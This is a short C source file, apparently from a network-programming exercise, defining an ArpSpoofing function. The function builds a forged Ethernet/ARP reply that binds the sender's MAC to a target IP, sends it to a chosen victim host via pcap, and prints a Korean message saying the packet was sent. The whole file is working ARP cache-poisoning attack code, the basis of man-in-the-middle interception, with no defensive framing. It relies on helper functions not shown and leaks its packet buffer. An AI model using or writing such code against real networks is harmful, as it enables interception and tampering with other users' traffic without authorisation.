#include "stdafx.h"
#include "header.h"

bool ArpSpoofing(pcap_t* handle, const uint8_t* myMac, const uint8_t* targetIP, const uint8_t* attMac, const uint8_t* attIP) {
	static const uint8_t broadMac[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

	uint8_t* packet = (uint8_t*)malloc(sizeof(uint8_t) * (SIZE_ETHERNET_HEADER + SIZE_ARP_HEADER));
	L2Ethernet* eth = (L2Ethernet*)packet;
	L3Arp* arp = (L3Arp*)(packet + SIZE_ETHERNET_HEADER);

	MakeL2Ethernet(eth, attMac, myMac, ETH_TYPE_ARP);
	MakeL3Arp(arp, ARP_OPCODE_REPLY, myMac, targetIP, attMac, attIP);
	PcapSend(handle, packet, SIZE_ETHERNET_HEADER + SIZE_ARP_HEADER);

	puts("ARP REPLY 패킷 전송");

	return RETURN_SUCCESS;
}